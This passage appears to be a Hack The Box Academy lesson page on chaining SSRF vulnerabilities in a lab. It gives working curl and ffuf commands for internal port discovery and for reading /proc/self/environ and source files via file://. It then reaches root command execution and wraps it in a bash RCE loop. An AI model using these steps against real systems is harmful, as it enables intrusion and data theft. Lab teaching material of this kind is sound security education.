+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=index.html"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 83
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 13:51:15 GMT
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Internal Web Application&lt;/h1&gt;
+&lt;a&gt;Hello World!&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>Now, let us discover any web applications listening in localhost. Let us try to issue a request to a random port to identify how responses from closed ports look.</p>
+<h4>cURL - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 97
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 14:52:32 GMT
+
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http127.0.0.1:1&lt;/h1&gt;&lt;a&gt;unknown url type: http127.0.0.1&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>We have received an <code>unknown url type</code> error message. It seems the web application is removing <code>://</code> from our request. Let's try to overcome this situation by modifying the URL.</p>
+<h4>cURL - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 99
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 14:55:10 GMT
+
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:1&lt;/h1&gt;&lt;a&gt;[Errno 111] Connection refused&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>In this case, the web application returns some HTML rendered content containing the resource we are trying to fetch. This response will affect our internal service discovery if we use the size of the response as a filter as it will change depending on the port. Fortunately for us, ffuf supports regular expressions for filtering. We can use this ffuf feature to use the error number for filtering responses, as follows.</p>
+<h4>Port Fuzzing</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Port Fuzzing</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">ffuf -w ./ports.txt:PORT -u <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT"</span> -fr <span class="token string">'Errno[[:blank:]]111'</span></span></span>
+
+
+<span class="token output">        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT
+ :: Wordlist         : PORT: ./ports.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Regexp: Errno[[:blank:]]111
+________________________________________________
+
+80                      [Status: 200, Size: 153, Words: 5, Lines: 6]
+5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]
+:: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>We have found another application listening on port 5000. In this case, the application responds with a list of files.</p>
+<h4>cURL - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 385
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 20:30:07 GMT
+
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/&lt;/h1&gt;&lt;a&gt;total 24K
+drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
+drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
+-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
+-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
+-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
+-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
+ &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>Let us make a quick recap of what we have achieved:</p>
+<ul>
+<li>Issue requests on behalf of ubuntu-web to internal.app.local</li>
+<li>Reach a web application listening on port 5000 inside internal.app.local chaining two SSRF vulnerabilities</li>
+<li>Disclose a list of files via the internal application</li>
+</ul>
+<p>Let us now uncover the source code of the web applications listening on <code>internal.app.local</code> to see how we can achieve remote code execution.</p>
+<p>Let us issue a request to disclose <code>/proc/self/environ</code> file, where the current path should be present under the <code>PWD</code> environment variable.</p>
+<h4>cURL - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///proc/self/environ"</span> -o -</span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 584
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 16:52:20 GMT
+
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: file:///proc/self/environ&lt;/h1&gt;&lt;a&gt;HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>Now we know that the current path is <code>/app</code>, and we have a list of interesting files. Let's disclose the <code>internal_local.py</code> file as follows.</p>
+<h4>Retrieving a local file through the target application - File Schema</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Retrieving a local file through the target application - File Schema</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 771
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 20:40:28 GMT
+
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: file:///app/internal_local.py&lt;/h1&gt;&lt;a&gt;import os
+from flask import *
+import urllib
+import subprocess
+
+basedir = os.path.abspath(os.path.dirname(__file__))
+
+app = Flask(__name__)
+
+def run_command(command):
+    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout = p.stdout.read()
+    stderr = p.stderr.read()
+    result = stdout.decode() + " " + stderr.decode()
+    return result
+
+@app.route("/")
+def index():
+    return run_command("ls -lha")
+
+@app.route("/runme")
+def runmewithargs():
+    command = request.args.get("x")
+    if command == "":
+        return "Use /runme?x=&lt;CMD&gt;"
+    return run_command(command)
+
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=5000)
+&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>By studying the source code above, we notice a functionality that allows us to execute commands on the remote host sending a GET request to<code>/runme?x=&lt;CMD&gt;</code>. Let us confirm remote code execution by sending <code>whoami</code> as a command.</p>
+<h4>cURL - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"</span></span></span>
+
+<span class="token output">HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 93
+Server: Werkzeug/2.0.2 Python/3.8.12
+Date: Tue, 19 Oct 2021 20:48:32 GMT
+
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/runme?x=whoami&lt;/h1&gt;&lt;a&gt;root
+ &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>We can execute commands under the superuser context on the target application. But what happens if we try to submit a command with arguments, such as the below?</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session">
+<span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -i -s <span class="token string">"http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"</span></span></span>
+
+<span class="token output">HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')
+Connection: close
+Content-Type: text/html;charset=utf-8
+Content-Length: 586
+
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd"&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;
+        &lt;title&gt;Error response&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Error response&lt;/h1&gt;
+        &lt;p&gt;Error code: 400&lt;/p&gt;
+        &lt;p&gt;Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').&lt;/p&gt;
+        &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>To execute commands with arguments or special characters, we need to encode them three times as we pass them through three different web applications.</p>
+<p>For doing so, you can use any online URL-encoding service such as <a href="https://www.urlencoder.org/" target="_blank" rel="noopener nofollow">urlencoder.org</a>. A quick way to achieve this from the terminal also exists. This is to use <code>jq</code>, which supports encoding as follows:</p>
+<h4>Install JQ</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Install JQ</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> jq</span></span>
+<span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"encode me"</span> <span class="token operator">|</span> jq -sRr @uri</span></span>
+<span class="token output">encode%20me%0A
+</span></code></pre></div></div>
+<p>We can now create a bash function to automate executing commands on the target application.</p>
+<h4>Automate executing commands</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Automate executing commands</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token keyword">function</span> <span class="token function-name function">rce</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span></span>
+<span class="token output">function&gt; while true; do
+</span><span class="token info punctuation">function while&gt; echo -n "</span><span class="token command"><span class="token shell-symbol important">#</span> <span class="token bash language-bash"><span class="token string">"; read cmd
+function while&gt; ecmd=<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $cmd <span class="token operator">|</span> jq -sRr @uri <span class="token operator">|</span> jq -sRr @uri <span class="token operator">|</span> jq -sRr @uri<span class="token variable">)</span></span>
+function while&gt; curl -s -o - "</span>http://</span></span><span class="token info punctuation">&lt;TARGET IP&gt;/load?q=http<span class="token punctuation">:</span><span class="token path">//internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=</span></span><span class="token command"><span class="token shell-symbol important">$</span><span class="token bash language-bash"><span class="token punctuation">{</span>ecmd<span class="token punctuation">}</span><span class="token string">"
+function while&gt; echo "</span></span></span><span class="token output">"
+function while&gt; done
+function&gt; }
+</span></code></pre></div></div>
+<p>Now we need to call the function and execute commands via:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Automate executing commands</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">rce</span></span>
+<span class="token command"><span class="token shell-symbol important">#</span> <span class="token bash language-bash"><span class="token function">uname</span> -a<span class="token punctuation">;</span> <span class="token function">hostname</span><span class="token punctuation">;</span> <span class="token function">whoami</span></span></span>
+
+<span class="token output">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami
+</span><span class="token info punctuation">&lt;/h1&gt;&lt;a&gt;Linux a054d48cc0a4 5.8.0-63-generic </span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token number">71</span>-Ubuntu SMP Tue Jul <span class="token number">13</span> <span class="token number">15</span>:59:12 UTC <span class="token number">2021</span> x86_64 GNU/Linux</span></span>
+<span class="token output">a054d48cc0a4
+root
+ &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<blockquote>
+<p><strong>Exercise for the reader:</strong> Obtain a fully interactive reverse-shell</p>
+</blockquote>
+<div id="screen" style="height: 600px; border: 1px solid;">
+<div class="screenPlaceholder">
+<div class="instanceLoading" style="display: none;">
+<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i></h1>
+<div class="text-center">Instance is starting...</div>
+</div>
+<div class="instanceTerminating" style="display: none;">
+<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i></h1>
+<div class="text-center">Terminating instance...</div>
+</div>
+<div class="row instanceStart max-width-canvas">
+<div class="col-4"></div>
+<div class="col-4">
+<button class=" startInstanceBtn btn btn-primary btn-lg btn-block" style="margin-top: 270px;">Start Instance</button>
+<p class="text-center mt-2 font-size-13 font-secondary">
+<span class="text-success spawnsLeft">
+<i class="fal fa-infinity"></i>
+</span> / 1 spawns left
+</p>
+</div>
+<div class="col-4"></div>
+</div>
+</div>
+</div>
+<div class="row align-center justify-center my-4">
+<div class="col-5 justify-start">
+<button style="display:none;" target="_blank" class="instance-button fullScreenBtn btn btn-light btn-sm float-left "><i class="fad fa-expand text-success mr-1"></i> &nbsp;Full Screen</button>
+<button style="display:none;" class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate</button>
+<button style="display:none;" class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1"><i class="fad fa-sync text-warning mr-2"></i> &nbsp;Reset</button>
+<div class="btn-group " role="group">
+<button style="display:none;cursor: default;" class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1">Life Left: <span class="lifeLeft"></span>m</button>
+<button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm " data-original-title="" title=""><i class="fa fa-plus text-success"></i></button>
+</div>
+</div>
+<div id="statusText" class="col-7 justify-end pt-2 pr-2 font-size-small text-right">Waiting to start...</div>
+</div>
+<div class="card" id="questionsDiv">
+<div class="card-body">
+<div class="row">
+<div class="col-9">
+<h4 class="card-title mt-0 font-size-medium">Questions</h4>
+<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below to complete this Section and earn cubes!</p>
+<p class="card-title-desc font-size-large font-size-15">
+Target: <span class="text-success"><span class="target" style="cursor:pointer;"><span class="spawnTargetBtn">Click here to spawn the target system!</span></span></span>
+<button class="resetTargetBtn btn btn-light btn-sm " data-toggle="tooltip" data-title="Reset Target" style="cursor: pointer; display: none;" data-original-title="" title=""><i class="fad fa-sync text-warning"></i></button>
+<br>
+<span class="targetLifeTimeContainer" style="display: none;">Time Left: <span class="targetLifeTime  font-size-15">0</span> minutes</span>
+</p>
+</div>
+<div class="col-3 text-right float-right">
+<a href="https://academy.hackthebox.com/vpn/key" class="btn btn-light bg-color-blue-nav mt-2" data-toggle="tooltip" data-title="Key is already installed in &quot;My Workstation&quot;" target="_blank" rel="noopener nofollow" data-original-title="" title=""><i class="fad fa-chart-network mr-2"></i>Get VPN Key</a>
+</div>
+</div>
+<div>
+<div>
+<label class="module-question" for="893"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Replicate what you learned in this section to gain code execution on the spawned target, then look for the flag in the root directory and submit the contents as your answer.</label>
+<div class="row">
+<div class=" col-lg-8  mb-4">
+<input class="form-control bg-color-blue-nav" id="answer893" type="text" color="green" placeholder="Submit your answer here..." maxlength="191">
+</div>
+<div class="col-lg-2 mb-4">
+<button class="btn btn-primary btn-block btnAnswer" id="btnAnswer893" data-question-id="893"><i class="fad fa-flag-checkered mr-2"></i> Submit</button>
+</div>
+<div class="col-lg-2 mb-4">
+<button class="btn btn-outline-warning btn-block" data-toggle="modal" id="hintBtn893" data-target="#hint893"><i class="fad fa-life-ring mr-2"></i> Hint</button>
+</div>
+</div>
+<div class=""></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="card bg-color-blue-nav" style="margin: 30px 0">
+<div class="card-body">
+<a href="https://academy.hackthebox.com/module/145/section/1297" class="btn btn-light module-button py-2" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</a>
+<form action="https://academy.hackthebox.com/module" method="POST" class="form-inline" id="completeForm" style="float: right">
+<input type="hidden" name="module_id" value="145">
+<input type="hidden" name="page_id" value="7">
+<input type="hidden" name="completed" value="1">
+<button id="completeBtn" class="btn btn-outline-success" style="display:none;"><i class="fa fa-check-circle"></i> Mark Complete &amp; Next</button>
+</form>
+<a href="https://academy.hackthebox.com/module/145/section/1299" class="btn btn-light ml-2 module-button py-2" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></a>
+</div>
+</div>
+</div>
+<div class="col-md-12 col-xl-3 col-xxl-3">
+<div id="table-of-contents">
+<div class="card">
+<div class="card-body bg-color-blue-nav">
+<a href="https://academy.hackthebox.com/module/145/section/1298#questionsDiv" class="btn btn-light btn-block module-button"><i class="fad fa-question mr-2"></i> Go to Questions</a>
+</div>
+</div>
+<div class="card" id="TOC">
+<div class="card-body bg-color-blue-nav">
+<h5 class="card-title font-size-15 mb-4">Table of Contents</h5>
+<a href="https://academy.hackthebox.com/module/145/section/1293" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Introduction to Server-Side Attacks</span>
+</a>
+<h6 class="mt-4 mb-2">Abusing Intermediary Applications</h6> <a href="https://academy.hackthebox.com/module/145/section/1294" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">AJP Proxy</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1295" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Nginx Reverse Proxy &amp; AJP</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1296" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Apache Reverse Proxy &amp; AJP</span>
+</a>
+<h6 class="mt-4 mb-2">Server-Side Request Forgery (SSRF)</h6> <a href="https://academy.hackthebox.com/module/145/section/1297" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Server-Side Request Forgery (SSRF) Overview</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1298" class="btn   text-primary  btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSRF Exploitation Example</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1299" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Blind SSRF</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1300" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Blind SSRF Exploitation Example</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1301" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Time-Based SSRF</span>
+</a>
+<h6 class="mt-4 mb-2">Server-Side Includes (SSI) Injection</h6> <a href="https://academy.hackthebox.com/module/145/section/1302" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Server-Side Includes Overview</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1303" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSI Injection Exploitation Example</span>
+</a>
+<h6 class="mt-4 mb-2">Edge-Side Includes (ESI) Injection</h6> <a href="https://academy.hackthebox.com/module/145/section/1304" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Edge-Side Includes (ESI)</span>
+</a>
+<h6 class="mt-4 mb-2">Server-Side Template Injections</h6> <a href="https://academy.hackthebox.com/module/145/section/1305" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Introduction to Template Engines</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1306" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">SSTI Identification</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1307" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSTI Exploitation Example 1</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1344" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSTI Exploitation Example 2</span>
+</a>
+<a href="https://academy.hackthebox.com/module/145/section/1343" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">SSTI Exploitation Example 3</span>
+</a>
+<h6 class="mt-4 mb-2">Extensible Stylesheet Language Transformations Server-Side Injections</h6> <a href="https://academy.hackthebox.com/module/145/section/1308" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Attacking XSLT</span>
+</a>
+<h6 class="mt-4 mb-2">Skills Assessment</h6> <a href="https://academy.hackthebox.com/module/145/section/1346" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Server-Side Attacks - Skills Assessment</span>
+</a>
+</div>
+</div>
+<div class="card">
+<div class="card-body bg-color-blue-nav">
+<h5 class="card-title mb-4">My Workstation</h5>
+<div class="row">
+<div class="col-12">
+<div id="sidePreview" style="height: 160px; border: 1px solid #323232; border-radius: 5px; background-color: #0a121c; text-align: center">
+<div class="screenPlaceholder">
+<p class="instanceStart" style="padding-top:70px; letter-spacing: 5px;">OFFLINE</p>
+<p class="instanceLoading " style="padding-top:70px; display: none"><i class="fa fa-circle-notch fa-spin"></i> Starting...</p>
+</div>
+</div>
+</div>
+<div class="col-12 mt-2">
+<div class="instanceStart">
+<button class=" startInstanceBtn btn btn-light btn-sm mt-2 btn-block module-button py-2"><i class="fad fa-play-circle text-success"></i> &nbsp;Start Instance</button>
+<p class="text-center mt-2 font-size-13 font-secondary">
+<span class="text-success spawnsLeft">
+<i class="fal fa-infinity"></i>
+</span> / 1 spawns left
+</p>
+</div>
+<button style="display:none;" class="fullScreenBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-expand text-success"></i> &nbsp;Interact</button>
+<button style="display:none;" class="terminateInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate</button>
+<button style="display:none;" class="resetInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-sync text-warning"></i> &nbsp;Reset</button>
